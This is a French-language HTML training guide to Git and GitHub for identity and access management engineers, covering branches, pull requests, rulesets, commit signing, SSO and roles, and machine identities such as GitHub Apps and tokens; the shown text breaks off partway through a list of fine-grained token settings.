<section id="accueil" data-group="Démarrer" data-title="Accueil" class="hero">
  <div class="eyebrow">Guide de montée en compétence · version octobre 2026</div>
  <h1>Maîtriser <em>GitHub</em>, et surtout qui a le droit d'y faire quoi.</h1>
  <p class="lead">Ce guide part de zéro : Git, les branches, les pull requests. Puis il va jusqu'à ce qu'un ingénieur IAM doit savoir : identités humaines et machine, GitHub Apps, jetons, OIDC vers Azure et Vault, protection des branches, secrets, audit.</p>
  <div class="meta-row">
    <span class="chip">Git 2.x</span>
    <span class="chip">GitHub.com · Enterprise Cloud</span>
    <span class="chip">Actions · OIDC</span>
    <span class="chip ok">bon réflexe</span><span class="chip chg">piège</span><span class="chip fail">risque</span>
  </div>
  <div class="note">
    <b>Comment lire ce guide</b>
    <p>Les parties 1 à 3 (Comprendre, Git en pratique, Collaborer) sont les fondations : ne les sautez pas. Les parties suivantes (Identités, Actions, OIDC, Sécurité, Gouvernance) forment le cœur IAM. Chaque partie renvoie à un TP à faire sur votre compte GitHub personnel.</p>
    <p>La barre en haut cherche dans ce guide ; l'onglet <b>Recherche doc officielle</b> ouvre docs.github.com et les autres sources officielles.</p>
  </div>
</section>

<section id="parcours" data-group="Démarrer" data-title="Parcours conseillé">
  <div class="eyebrow">Plan de progression</div>
  <h2>Votre parcours sur 90 jours</h2>
  <div class="tbl"><table>
    <thead><tr><th>Période</th><th>Objectif</th><th>TP associé</th></tr></thead>
    <tbody>
      <tr><td>Semaine 1</td><td>Git en local : commit, branche, fusion, annuler une erreur</td><td>TP 1</td></tr>
      <tr><td>Semaine 2</td><td>GitHub : dépôt distant, pull request, revue, règles de protection</td><td>TP 2 et 3</td></tr>
      <tr><td>Semaines 3–4</td><td>Identités humaines : 2FA, rôles, équipes, SSO/SCIM (en théorie, car il faut une offre Enterprise)</td><td>TP 4</td></tr>
      <tr><td>Semaines 5–6</td><td>Identités machine : PAT fine-grained, GitHub App, deploy key ; rotation et révocation</td><td>TP 5 et 6</td></tr>
      <tr><td>Semaines 7–8</td><td>GitHub Actions : workflows, secrets, environnements, permissions minimales</td><td>TP 7</td></tr>
      <tr><td>Semaines 9–10</td><td>OIDC sans secret vers Azure (Entra ID) ; Vault et AWS en lecture</td><td>TP 8</td></tr>
      <tr><td>Semaines 11–13</td><td>Sécurité et gouvernance : secret scanning, Dependabot, signature, audit, inventaire des identités machine</td><td>TP 9 et 10</td></tr>
    </tbody>
  </table></div>
  <p>Certifications officielles, dans l'ordre : <b>GitHub Foundations</b>, puis <b>GitHub Actions</b>, puis <b>GitHub Advanced Security</b> et <b>GitHub Administration</b>. Le parcours gratuit <b>GitHub Skills</b> (skills.github.com) propose des exercices guidés qui complètent bien ce guide.</p>
</section>

<section id="git-vs-github" data-group="Comprendre" data-title="Git ou GitHub ?">
  <div class="eyebrow">Les bases</div>
  <h2>Git ou GitHub ?</h2>
  <p>On les confond souvent. Ce sont deux choses différentes :</p>
  <div class="grid2">
    <div class="card"><h4>Git</h4><p>Un logiciel libre, installé sur votre PC, qui enregistre l'historique des versions d'un dossier. Il fonctionne sans Internet et sans GitHub.</p></div>
    <div class="card"><h4>GitHub</h4><p>Un service en ligne (Microsoft) qui héberge des dépôts Git et ajoute la collaboration : pull requests, revues, automatisation (Actions), sécurité, gestion des accès.</p></div>
  </div>
  <p>Autres plateformes du même type : GitLab, Bitbucket, Azure DevOps Repos. Ce que vous apprenez sur Git vaut partout ; ce qui concerne GitHub (Actions, Apps, rulesets) lui est propre.</p>
  <h3>Pourquoi c'est un sujet IAM</h3>
  <p>Dans une grande entreprise, GitHub contient le code des applications, mais aussi l'infrastructure (Terraform), la configuration (Ansible) et les pipelines qui déploient en production. Celui qui peut modifier une branche ou un workflow peut souvent, indirectement, modifier la production. Les questions « qui a accès ? », « avec quelle identité ? », « avec quel jeton ? » et « qui a approuvé ? » sont donc des questions de sécurité de premier ordre.</p>
</section>

<section id="modele-git" data-group="Comprendre" data-title="Comment Git fonctionne">
  <div class="eyebrow">Sous le capot</div>
  <h2>Comment Git fonctionne</h2>
  <h3>Les trois zones</h3>
  <figure>
    <div class="diagram">
    <svg viewBox="0 0 860 210" role="img" aria-labelledby="zonesT">
      <title id="zonesT">Les zones de Git : répertoire de travail, index, dépôt local, dépôt distant</title>
      <defs><marker id="ar" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" style="fill:var(--ink-2)"/></marker></defs>
      <g style="font:12px var(--f-body)">
        <rect x="10" y="40" width="180" height="90" rx="8" style="fill:var(--surface);stroke:var(--line)"/>
        <text x="24" y="68" style="fill:var(--ink);font:700 14px var(--f-display)">Répertoire de travail</text>
        <text x="24" y="90" style="fill:var(--ink-2)">vos fichiers, modifiés</text><text x="24" y="108" style="fill:var(--ink-2)">librement</text>
        <rect x="235" y="40" width="180" height="90" rx="8" style="fill:var(--surface);stroke:var(--line)"/>
        <text x="249" y="68" style="fill:var(--ink);font:700 14px var(--f-display)">Index (staging)</text>
        <text x="249" y="90" style="fill:var(--ink-2)">ce qui partira dans</text><text x="249" y="108" style="fill:var(--ink-2)">le prochain commit</text>
        <rect x="460" y="40" width="180" height="90" rx="8" style="fill:var(--accent-soft);stroke:var(--accent)"/>
        <text x="474" y="68" style="fill:var(--accent);font:700 14px var(--f-display)">Dépôt local (.git)</text>
        <text x="474" y="90" style="fill:var(--ink-2)">historique des commits</text><text x="474" y="108" style="fill:var(--ink-2)">sur votre PC</text>
        <rect x="685" y="40" width="165" height="90" rx="8" style="fill:var(--surface);stroke:var(--line)"/>
        <text x="699" y="68" style="fill:var(--ink);font:700 14px var(--f-display)">Dépôt distant</text>
        <text x="699" y="90" style="fill:var(--ink-2)">origin, sur GitHub</text>
      </g>
      <g style="fill:none;stroke:var(--ink-2);stroke-width:1.4">
        <path d="M190 70 H231" marker-end="url(#ar)"/><path d="M415 70 H456" marker-end="url(#ar)"/><path d="M640 70 H681" marker-end="url(#ar)"/>
        <path d="M681 110 H644" marker-end="url(#ar)"/><path d="M460 150 Q300 195 105 134" marker-end="url(#ar)"/>
      </g>
      <g style="font:600 12px var(--f-mono);fill:var(--accent)">
        <text x="193" y="60">add</text><text x="414" y="60">commit</text><text x="648" y="60">push</text><text x="644" y="128">fetch/pull</text><text x="250" y="188">switch / restore</text>

    <figcaption>On modifie dans le répertoire de travail, on choisit ce qu'on enregistre avec <code>git add</code>, on enregistre avec <code>git commit</code>, on partage avec <code>git push</code>.</figcaption>
  </figure>
  <h3>Les notions clés</h3>
  <dl class="kv">
    <dt>Commit</dt><dd>Une photo complète du projet à un instant, avec un auteur, une date, un message et un identifiant unique (empreinte SHA, ex. <code>3f9a1c2</code>). Un commit pointe vers son ou ses parents : l'historique est une chaîne.</dd>
    <dt>Branche</dt><dd>Une simple étiquette mobile qui pointe vers un commit. Créer une branche est instantané et ne copie rien.</dd>
    <dt>HEAD</dt><dd>« Où vous êtes » : la branche (ou le commit) actuellement extraite.</dd>
    <dt>main</dt><dd>La branche principale par convention (anciennement <code>master</code>).</dd>
    <dt>Remote</dt><dd>Un dépôt distant ; <code>origin</code> est le nom par défaut de celui que vous avez cloné.</dd>
    <dt>Merge</dt><dd>Réunir l'historique de deux branches.</dd>
    <dt>Rebase</dt><dd>Rejouer vos commits par-dessus une autre branche pour obtenir un historique linéaire.</dd>
    <dt>Tag</dt><dd>Une étiquette fixe sur un commit (ex. <code>v1.4.0</code>), utilisée pour les versions.</dd>
  </dl>
  <div class="note warn"><b>Point essentiel pour la sécurité</b><p>Dans Git, l'auteur d'un commit (<code>user.name</code>, <code>user.email</code>) est déclaratif : n'importe qui peut écrire le nom de quelqu'un d'autre. Seule une <b>signature</b> de commit prouve qui l'a créé, et seule l'identité de la personne qui <b>pousse</b> est vérifiée par GitHub. On y revient dans la section « Signer ses commits ».</p></div>
</section>

  <dl class="kv">
    <dt>Compte personnel</dt><dd>Une personne, un compte. Sur GitHub.com classique, le compte appartient à la personne, pas à l'entreprise.</dd>
    <dt>Organisation</dt><dd>Un espace partagé qui possède des dépôts, des équipes et des réglages de sécurité.</dd>
    <dt>Équipe (team)</dt><dd>Un groupe de membres. On donne les droits aux équipes, jamais à des personnes une par une.</dd>
    <dt>Enterprise</dt><dd>Le niveau au-dessus des organisations (offre GitHub Enterprise Cloud) : SSO obligatoire, provisionnement automatique, politiques communes, audit global.</dd>
    <dt>Enterprise Managed Users (EMU)</dt><dd>Variante d'Enterprise Cloud où les comptes sont créés et supprimés par votre fournisseur d'identité (Entra ID) : l'entreprise possède les comptes, comme dans un annuaire.</dd>

  <h3>Visibilité d'un dépôt</h3>
  <div class="tbl"><table>
    <thead><tr><th>Visibilité</th><th>Qui peut voir</th></tr></thead>
    <tbody>
      <tr><td><code>public</code></td><td>Tout Internet</td></tr>
      <tr><td><code>private</code></td><td>Seulement les personnes et équipes autorisées</td></tr>
      <tr><td><code>internal</code></td><td>Tous les membres de l'enterprise (offre Enterprise uniquement) : utile pour l'« inner source »</td></tr>
    </tbody>
  </table></div>
  <div class="note danger"><b>Un dépôt public par erreur</b><p>C'est une fuite classique : un dépôt passé en public ou créé sur un compte personnel avec du code d'entreprise. Les organisations d'entreprise interdisent en général la création de dépôts publics et la bifurcation (fork) des dépôts privés vers des comptes personnels.</p></div>
</section>

<section id="config" data-group="Git en pratique" data-title="Installer et configurer">
  <div class="eyebrow">Étape 1</div>
  <h2>Installer et configurer Git</h2>
  <div class="code"><span class="lbl">Linux Mint / Ubuntu</span><pre>sudo apt install -y git
git --version

<span class="c"># Identité utilisée dans vos commits</span>
git config --global user.name "kevmat242"
git config --global user.email "votre-email@exemple.com"
git config --global init.defaultBranch main
git config --global pull.rebase true          <span class="c"># historique plus propre</span>
git config --global core.editor "nano"        <span class="c"># ou "code --wait" pour VS Code</span>
git config --list --show-origin               <span class="c"># voir toute la configuration</span></pre></div>
  <div class="note ok"><b>Masquer votre adresse e-mail</b><p>Dans GitHub, <b>Settings → Emails</b>, cochez « Keep my email addresses private » et utilisez l'adresse <code>ID+pseudo@users.noreply.github.com</code> affichée dans <code>user.email</code>. Votre vraie adresse n'apparaîtra pas dans l'historique public.</p></div>
  <h3>S'authentifier auprès de GitHub</h3>
  <div class="tbl"><table>
    <thead><tr><th>Méthode</th><th>Usage</th></tr></thead>
    <tbody>
      <tr><td><b>Clé SSH</b> (<code>git@github.com:…</code>)</td><td>Ce que vous avez configuré. Simple et sûr pour un poste de travail.</td></tr>
      <tr><td><b>HTTPS + Git Credential Manager</b></td><td>Connexion par navigateur, jeton stocké de façon sécurisée. Courant sous Windows.</td></tr>
      <tr><td><b>GitHub CLI</b> (<code>gh auth login</code>)</td><td>Pour Git et pour piloter GitHub en ligne de commande (PR, issues, API).</td></tr>
      <tr><td>Mot de passe du compte</td><td>Refusé par GitHub pour Git depuis 2021.</td></tr>
    </tbody>
  </table></div>
  <div class="code"><span class="lbl">Installer GitHub CLI</span><pre>sudo apt install -y gh        <span class="c"># ou depuis cli.github.com pour la dernière version</span>
gh auth login                 <span class="c"># GitHub.com → SSH → utiliser votre clé existante → navigateur</span>
gh auth status</pre></div>
</section>

<section id="commandes" data-group="Git en pratique" data-title="Les commandes de base">
  <div class="eyebrow">Étape 2</div>
  <h2>Les commandes de base</h2>
  <div class="code"><span class="lbl">Le cycle quotidien</span><pre>git clone git@github.com:kevmat242/mes-guides.git   <span class="c"># récupérer un dépôt</span>
cd mes-guides
git status                     <span class="c"># qu'est-ce qui a changé ? (à taper tout le temps)</span>
git diff                       <span class="c"># détail des modifications non indexées</span>
git add fichier.txt            <span class="c"># préparer un fichier</span>
git add -p                     <span class="c"># choisir morceau par morceau (très utile)</span>
git diff --staged              <span class="c"># ce qui va partir dans le commit</span>
git commit -m "Ajoute la page d'accueil"
git push                       <span class="c"># envoyer sur GitHub</span>
git pull                       <span class="c"># récupérer les changements des autres</span>
git log --oneline --graph --all   <span class="c"># historique lisible</span></pre></div>
  <h3>Écrire de bons messages de commit</h3>
  <ul>
    <li>Une première ligne courte (≈ 50 caractères), à l'impératif : « Ajoute la règle de rotation des jetons ».</li>
    <li>Si besoin, une ligne vide puis le <i>pourquoi</i> du changement.</li>
    <li>Un commit = un changement logique. Évitez « divers correctifs ».</li>
    <li>Beaucoup d'équipes suivent les <i>Conventional Commits</i> : <code>feat:</code>, <code>fix:</code>, <code>docs:</code>, <code>chore:</code>.</li>
  </ul>
</section>

<section id="branches" data-group="Git en pratique" data-title="Branches, fusion, conflits">
  <div class="eyebrow">Étape 3</div>
  <h2>Branches, fusion et conflits</h2>
  <div class="code"><pre>git switch -c feature/rotation-pat     <span class="c"># créer une branche et y aller</span>
<span class="c"># … modifications, add, commit …</span>
git push -u origin feature/rotation-pat   <span class="c"># publier la branche</span>
git switch main                        <span class="c"># revenir sur main</span>
git pull                               <span class="c"># mettre main à jour</span>
git merge feature/rotation-pat         <span class="c"># fusionner (en pratique : via une pull request)</span>
git branch -d feature/rotation-pat     <span class="c"># supprimer la branche locale</span></pre></div>
  <h3>Merge ou rebase ?</h3>
  <div class="grid2">
    <div class="card"><h4>merge</h4><p>Crée un commit de fusion qui réunit les deux historiques. Ne réécrit rien : sûr sur une branche partagée.</p></div>
    <div class="card"><h4>rebase</h4><p>Rejoue vos commits par-dessus <code>main</code> : historique linéaire. Réécrit les identifiants de commits : à réserver à <b>votre</b> branche, jamais à <code>main</code>.</p></div>
  </div>
  <div class="code"><span class="lbl">Mettre votre branche à jour avec main</span><pre>git fetch origin
git rebase origin/main
git push --force-with-lease     <span class="c"># jamais --force tout court</span></pre></div>
  <h3>Résoudre un conflit, sans paniquer</h3>
  <p>Un conflit arrive quand deux branches modifient les mêmes lignes. Git s'arrête et marque le fichier :</p>
  <div class="code"><pre>&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD
token_max_lifetime_days = 90
=======
token_max_lifetime_days = 30
&gt;&gt;&gt;&gt;&gt;&gt;&gt; feature/rotation-pat</pre></div>
  <ol class="steps">
    <li><code>git status</code> liste les fichiers en conflit.</li>
    <li>Ouvrez chaque fichier, gardez la bonne version (ou un mélange), supprimez les marqueurs <code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</code>, <code>=======</code>, <code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code>. VS Code propose des boutons « Accept Current / Incoming / Both ».</li>
    <li><code>git add fichier</code> pour marquer le conflit résolu.</li>
    <li><code>git commit</code> (après un merge) ou <code>git rebase --continue</code> (après un rebase).</li>
    <li>Perdu ? <code>git merge --abort</code> ou <code>git rebase --abort</code> ramène à l'état d'avant.</li>
  </ol>
</section>

<section id="erreurs" data-group="Git en pratique" data-title="Réparer ses erreurs">
  <div class="eyebrow">Filet de sécurité</div>
  <h2>Réparer ses erreurs</h2>
  <div class="tbl"><table>
    <thead><tr><th>Situation</th><th>Commande</th></tr></thead>
    <tbody>
      <tr><td>Annuler les modifications d'un fichier non commité</td><td><code>git restore fichier</code></td></tr>
      <tr><td>Retirer un fichier de l'index (sans perdre les modifs)</td><td><code>git restore --staged fichier</code></td></tr>
      <tr><td>Corriger le dernier commit (message ou fichier oublié), pas encore poussé</td><td><code>git commit --amend</code></td></tr>
      <tr><td>Annuler un commit déjà poussé (créer un commit inverse)</td><td><code>git revert &lt;sha&gt;</code></td></tr>
      <tr><td>Revenir en arrière localement, en gardant les modifs</td><td><code>git reset --soft HEAD~1</code></td></tr>
      <tr><td>Mettre de côté un travail en cours</td><td><code>git stash</code> puis <code>git stash pop</code></td></tr>
      <tr><td>Retrouver un commit « perdu » (après un reset raté)</td><td><code>git reflog</code> puis <code>git switch -c secours &lt;sha&gt;</code></td></tr>
    </tbody>
  </table></div>
  <div class="note warn"><b>La règle</b><p>Sur ce qui est déjà poussé et partagé, on <b>ajoute</b> (revert), on ne <b>réécrit</b> pas (reset, amend, rebase). <code>git reset --hard</code> efface vos modifications non commitées pour de bon : vérifiez deux fois.</p></div>
</section>

<section id="gitignore" data-group="Git en pratique" data-title=".gitignore et secrets">
  <div class="eyebrow">Hygiène</div>
  <h2>.gitignore et secrets : ce qui ne doit jamais être commité</h2>
  <div class="code"><span class="lbl">.gitignore type pour un dépôt IAM / infra</span><pre><span class="c"># Secrets et clés</span>
*.pem
*.key
*.p12
*.pfx
id_*
.env
.env.*
vault-files/
*vault-pass*

<span class="c"># Terraform</span>
.terraform/
*.tfstate
*.tfstate.*
*.tfplan
crash.log

<span class="c"># Ansible</span>
*.retry
logs/

<span class="c"># Éditeurs et système</span>
.vscode/
.idea/
.DS_Store</pre></div>
  <div class="note danger"><b>Vous avez poussé un secret ? Dans cet ordre :</b>
    <ol>
      <li><b>Révoquez-le immédiatement</b> (jeton, mot de passe, clé, certificat) et créez-en un nouveau. C'est la seule action qui protège vraiment : le secret a pu être copié dans les secondes qui suivent (des robots scrutent GitHub en continu).</li>
      <li>Vérifiez dans les journaux du système concerné s'il a été utilisé.</li>
      <li>Ensuite seulement, nettoyez l'historique avec <code>git filter-repo</code> (ou BFG) et forcez la mise à jour, en coordination avec l'équipe.</li>
      <li>Prévenez l'équipe sécurité selon la procédure de l'entreprise.</li>
    </ol>
    <p>Supprimer le fichier dans un nouveau commit ne suffit pas : le secret reste dans l'historique.</p></div>
</section>

<section id="pr" data-group="Collaborer" data-title="Pull requests et revue">
  <div class="eyebrow">Travailler à plusieurs</div>
  <h2>Pull requests et revue de code</h2>
  <p>Une <b>pull request</b> (PR) est une demande de fusion d'une branche dans une autre, avec discussion, revue et contrôles automatiques. C'est le point de contrôle central : c'est là que se joue le principe des « quatre yeux ».</p>
  <h3>GitHub Flow, le modèle le plus utilisé</h3>
  <ol class="steps">
    <li><code>main</code> est toujours déployable.</li>
    <li>Pour chaque changement : une branche courte (<code>feature/…</code>, <code>fix/…</code>).</li>
    <li>Ouvrir une PR tôt (en brouillon, « Draft ») pour discuter.</li>
    <li>Les contrôles automatiques (CI) tournent ; un ou plusieurs relecteurs approuvent.</li>
    <li>Fusion dans <code>main</code>, suppression de la branche, déploiement.</li>
  </ol>
  <div class="code"><span class="lbl">Avec GitHub CLI</span><pre>gh pr create --fill --draft          <span class="c"># ouvrir une PR en brouillon</span>
gh pr ready                          <span class="c"># la passer en prête pour revue</span>
gh pr checks                         <span class="c"># état de la CI</span>
gh pr review 12 --approve            <span class="c"># approuver la PR n° 12</span>
gh pr merge 12 --squash --delete-branch</pre></div>
  <h3>Les trois façons de fusionner</h3>
  <div class="tbl"><table>
    <thead><tr><th>Mode</th><th>Résultat</th></tr></thead>
    <tbody>
      <tr><td>Merge commit</td><td>Garde tous les commits + un commit de fusion</td></tr>
      <tr><td>Squash and merge</td><td>Un seul commit propre par PR (souvent le défaut en entreprise)</td></tr>
      <tr><td>Rebase and merge</td><td>Les commits rejoués à la suite, sans commit de fusion</td></tr>
    </tbody>
  </table></div>
  <h3>CODEOWNERS : qui doit relire quoi</h3>
  <div class="code"><span class="lbl">.github/CODEOWNERS</span><pre><span class="c"># Le dernier motif qui correspond l'emporte</span>
*                         @exemple-iam/iam-devs
/terraform/entra/         @exemple-iam/iam-admins
/.github/workflows/       @exemple-iam/platform-security
/.github/CODEOWNERS       @exemple-iam/platform-security</pre></div>
  <p>Combiné à la règle « Require review from Code Owners », une modification des workflows ou des accès Entra ID ne peut pas être fusionnée sans l'accord de l'équipe responsable.</p>
  <div class="note ok"><b>Bon réflexe de relecteur IAM</b><p>Dans une PR, regardez en priorité : les fichiers <code>.github/workflows/</code> (qui peut déclencher quoi, avec quelles permissions), les changements de droits (rôles, groupes, politiques), l'ajout de dépendances ou d'actions tierces, et tout ce qui ressemble à un secret.</p></div>
</section>

<section id="rulesets" data-group="Collaborer" data-title="Protéger les branches">
  <div class="eyebrow">Garde-fous</div>
  <h2>Protéger les branches : rulesets</h2>
  <p>Les <b>rulesets</b> (Settings → Rulesets) remplacent progressivement les anciennes « branch protection rules ». Ils peuvent s'appliquer à un dépôt, ou à toute une organisation.</p>
  <div class="tbl"><table>
    <thead><tr><th>Règle</th><th>Effet</th><th>Recommandé sur main</th></tr></thead>
    <tbody>
      <tr><td>Restrict deletions</td><td>Interdit de supprimer la branche</td><td>Oui</td></tr>
      <tr><td>Block force pushes</td><td>Interdit de réécrire l'historique</td><td>Oui</td></tr>
      <tr><td>Require a pull request before merging</td><td>Plus de push direct ; revue obligatoire (nombre d'approbations, Code Owners, rejet des approbations obsolètes)</td><td>Oui, au moins 1 approbation</td></tr>
      <tr><td>Require status checks to pass</td><td>La CI doit être verte</td><td>Oui</td></tr>
      <tr><td>Require signed commits</td><td>Seuls les commits signés et vérifiés passent</td><td>Selon la politique</td></tr>
      <tr><td>Require linear history</td><td>Pas de commit de fusion</td><td>Optionnel</td></tr>
      <tr><td>Require deployments to succeed</td><td>Le déploiement en recette doit avoir réussi</td><td>Optionnel</td></tr>
    </tbody>
  </table></div>
  <p><b>Enforcement status</b> : <code>Active</code> (appliqué), <code>Evaluate</code> (mesure sans bloquer, offre Enterprise), <code>Disabled</code>. La <b>bypass list</b> liste qui peut contourner les règles : gardez-la vide ou limitée à un rôle d'urgence, car chaque contournement est un trou dans votre contrôle.</p>
  <div class="note warn"><b>Piège</b><p>Les administrateurs du dépôt peuvent contourner les anciennes règles de protection si l'option « Do not allow bypassing » n'est pas cochée. Avec les rulesets, rien n'est contourné sauf ce qui est explicitement dans la bypass list.</p></div>
</section>

<section id="signature" data-group="Collaborer" data-title="Signer ses commits">
  <div class="eyebrow">Prouver l'auteur</div>
  <h2>Signer ses commits</h2>
  <p>Une signature prouve cryptographiquement qui a créé un commit. GitHub affiche alors un badge <span class="chip ok">Verified</span>. Le plus simple : signer avec votre clé SSH existante.</p>
  <div class="code"><span class="lbl">Signer avec SSH</span><pre>git config --global gpg.format ssh
git config --global user.signingkey ~/.ssh/id_ed25519.pub
git config --global commit.gpgsign true
git config --global tag.gpgsign true</pre></div>
  <p>Puis sur GitHub : <b>Settings → SSH and GPG keys → New SSH key</b>, choisissez <b>Key type : Signing Key</b> et collez la même clé publique (elle doit être ajoutée une seconde fois, comme clé de signature). Activez aussi <b>Vigilant mode</b> : les commits non signés à votre nom seront marqués <span class="chip chg">Unverified</span>.</p>
  <div class="code"><pre>git commit --allow-empty -m "Test de signature"
git log --show-signature -1</pre></div>
  <p>Alternatives : GPG (historique), ou <b>gitsign</b> (Sigstore), qui signe avec votre identité OIDC et un certificat de très courte durée, sans clé à gérer. Les commits faits depuis l'interface web de GitHub sont signés automatiquement par GitHub.</p>
</section>

<section id="humains" data-group="Identités" data-title="Identités humaines">
  <div class="eyebrow">Qui est qui</div>
  <h2>Les identités humaines</h2>
  <h3>Authentification du compte</h3>
  <ul>
    <li><b>2FA obligatoire</b> pour tout contributeur de code sur GitHub.com. Ordre de préférence : <b>passkey</b> ou clé de sécurité (FIDO2), application TOTP, et en dernier recours les SMS.</li>
    <li>Gardez les <b>codes de récupération</b> dans un coffre ; sans eux, la perte du second facteur peut signifier la perte du compte.</li>
    <li>Une organisation peut <b>exiger la 2FA</b> pour tous ses membres (les membres sans 2FA sont retirés).</li>
  </ul>
  <h3>SSO SAML ou OIDC avec Entra ID</h3>
  <p>Sur GitHub Enterprise Cloud, l'organisation ou l'enterprise délègue l'authentification à votre fournisseur d'identité (IdP). Deux modèles :</p>
  <div class="tbl"><table>
    <thead><tr><th></th><th>Comptes personnels + SAML SSO</th><th>Enterprise Managed Users (EMU)</th></tr></thead>
    <tbody>
      <tr><td>Propriétaire du compte</td><td>La personne</td><td>L'entreprise (créé par l'IdP)</td></tr>
      <tr><td>Connexion</td><td>Compte GitHub, puis passage obligatoire par l'IdP pour accéder aux ressources de l'organisation</td><td>Uniquement via l'IdP (SAML, ou OIDC avec Entra ID, qui permet d'appliquer l'accès conditionnel)</td></tr>
      <tr><td>Provisionnement</td><td>Invitation manuelle, ou SCIM pour l'appartenance</td><td>SCIM : création, mise à jour, suspension automatiques depuis Entra ID</td></tr>
      <tr><td>Départ d'un collaborateur</td><td>Le compte reste ; il faut le retirer de l'organisation</td><td>Désactivé dans Entra ID ⇒ suspendu dans GitHub</td></tr>
      <tr><td>Contributions publiques</td><td>Possibles</td><td>Impossibles (comptes cloisonnés, nom en <code>pseudo_shortcode</code>)</td></tr>
    </tbody>
  </table></div>
  <p><b>Team sync</b> / groupes SCIM : une équipe GitHub peut être liée à un groupe Entra ID. L'appartenance au groupe (gérée par votre IGA, avec revues d'accès) donne automatiquement l'accès aux dépôts. C'est le modèle à viser.</p>
  <div class="note warn"><b>Jetons et SSO</b><p>Avec SAML SSO, un PAT ou une clé SSH doit être <b>autorisé pour l'organisation</b> (bouton « Configure SSO » sur le jeton) avant de pouvoir accéder à ses ressources. Une révocation de session côté IdP ne coupe pas forcément un jeton déjà autorisé : d'où l'importance des durées de vie courtes.</p></div>
  <h3>Rôles d'organisation</h3>
  <div class="tbl"><table>
    <thead><tr><th>Rôle</th><th>Pouvoirs</th></tr></thead>
    <tbody>
      <tr><td>Owner</td><td>Tout : membres, facturation, sécurité, suppression. À limiter à 2 ou 3 personnes, idéalement en accès juste-à-temps.</td></tr>
      <tr><td>Member</td><td>Accès selon les équipes et la « base permission » de l'organisation</td></tr>
      <tr><td>Security manager</td><td>Lecture de tous les dépôts et gestion des alertes de sécurité, sans droits d'écriture</td></tr>
      <tr><td>Billing manager</td><td>Facturation uniquement</td></tr>
      <tr><td>Rôles personnalisés</td><td>Permissions fines (ex. gérer les rulesets, voir le journal d'audit) sans être Owner</td></tr>
      <tr><td>Outside collaborator</td><td>Prestataire ajouté à un dépôt précis, hors de l'organisation : à suivre de près</td></tr>
    </tbody>
  </table></div>
  <h3>Rôles sur un dépôt</h3>
  <div class="tbl"><table>
    <thead><tr><th>Rôle</th><th>Peut</th></tr></thead>
    <tbody>
      <tr><td>Read</td><td>Voir, cloner, ouvrir des issues</td></tr>
      <tr><td>Triage</td><td>+ gérer issues et PR, sans écrire de code</td></tr>
      <tr><td>Write</td><td>+ pousser des branches, fusionner (dans la limite des rulesets)</td></tr>
      <tr><td>Maintain</td><td>+ gérer certains réglages du dépôt</td></tr>
      <tr><td>Admin</td><td>Tout, y compris les règles de protection, les secrets et les accès</td></tr>
    </tbody>
  </table></div>
  <div class="note ok"><b>Bonnes pratiques</b><ul>
    <li><b>Base permission</b> de l'organisation à <code>No permission</code> ou <code>Read</code>, jamais <code>Write</code>.</li>
    <li>Droits attribués aux <b>équipes</b> (liées à des groupes Entra ID), pas aux individus.</li>
    <li><code>Admin</code> rare sur les dépôts : il permet de lire et modifier les secrets, de désactiver les protections.</li>
    <li>Revue trimestrielle : owners, collaborateurs externes, membres inactifs, droits Admin.</li>
  </ul></div>
</section>

<section id="machines" data-group="Identités" data-title="Identités machine">
  <div class="eyebrow">Le cœur du sujet</div>
  <h2>Les identités machine sur GitHub</h2>
  <p>Une pipeline, un outil (Terraform, Ansible, un scanner, un bot) ou une autre application qui parle à GitHub a besoin d'une identité. C'est là que se cachent la plupart des risques : jetons sans date d'expiration, liés au compte d'une personne partie depuis longtemps, avec des droits sur toute l'organisation.</p>
  <h3>Le comparatif à connaître par cœur</h3>
  <div class="tbl"><table>
    <thead><tr><th>Identité</th><th>Lié à</th><th>Durée de vie</th><th>Périmètre</th><th>Verdict</th></tr></thead>
    <tbody>
      <tr><td><b>GITHUB_TOKEN</b></td><td>Un run de workflow</td><td>Le temps du job</td><td>Le dépôt du workflow, permissions réglables</td><td><span class="chip ok">À privilégier</span> dans Actions</td></tr>
      <tr><td><b>GitHub App</b></td><td>L'application (pas une personne)</td><td>Jeton d'installation : 1 h</td><td>Permissions fines × dépôts choisis</td><td><span class="chip ok">À privilégier</span> pour toute automatisation durable</td></tr>
      <tr><td><b>Jeton OIDC</b> (Actions)</td><td>Un job</td><td>Minutes</td><td>Échangé contre un accès cloud ou Vault</td><td><span class="chip ok">À privilégier</span> pour sortir de GitHub</td></tr>
      <tr><td><b>PAT fine-grained</b></td><td>Une personne</td><td>Expiration obligatoire (max. selon politique)</td><td>Un propriétaire, dépôts et permissions choisis</td><td><span class="chip chg">Acceptable</span> pour un usage personnel ou un script ponctuel</td></tr>
      <tr><td><b>Deploy key</b></td><td>Un dépôt</td><td>Illimitée</td><td>Un seul dépôt, lecture (ou écriture)</td><td><span class="chip chg">Acceptable</span> pour un serveur qui clone un dépôt</td></tr>
      <tr><td><b>PAT classique</b></td><td>Une personne</td><td>Peut être sans expiration</td><td>Tous les dépôts accessibles à la personne, scopes larges</td><td><span class="chip fail">À éviter</span></td></tr>
      <tr><td><b>Compte « machine user »</b></td><td>Un faux humain</td><td>Illimitée</td><td>Celui d'un membre</td><td><span class="chip fail">À éviter</span> (licence, mot de passe et 2FA partagés)</td></tr>
    </tbody>
  </table></div>
  <h3>Choisir la bonne identité</h3>
  <ol>
    <li>Le traitement tourne dans GitHub Actions et ne touche que son dépôt ? <b>GITHUB_TOKEN</b> avec permissions minimales.</li>
    <li>Il doit accéder à Azure, AWS, GCP ou Vault ? <b>OIDC</b>, aucun secret stocké.</li>
    <li>Il doit agir sur plusieurs dépôts ou depuis l'extérieur (Terraform qui gère l'organisation, un bot, un outil interne) ? <b>GitHub App</b>.</li>
    <li>Un serveur doit seulement cloner un dépôt ? <b>Deploy key</b> en lecture seule.</li>
    <li>Un humain a besoin d'un jeton pour un script personnel ? <b>PAT fine-grained</b> avec expiration courte.</li>
  </ol>
  <h3>PAT fine-grained : les bons réglages</h3>
  <ul>
    <li><b>Resource owner</b> : votre compte ou une organisation (un jeton = un seul propriétaire).</li>
    <li><b>Expiration</b> : 7 à 90 jours selon l'usage, jamais « No expiration ».</li>
    <li><b>Repository access</b> : « Only select repositories ».</li>
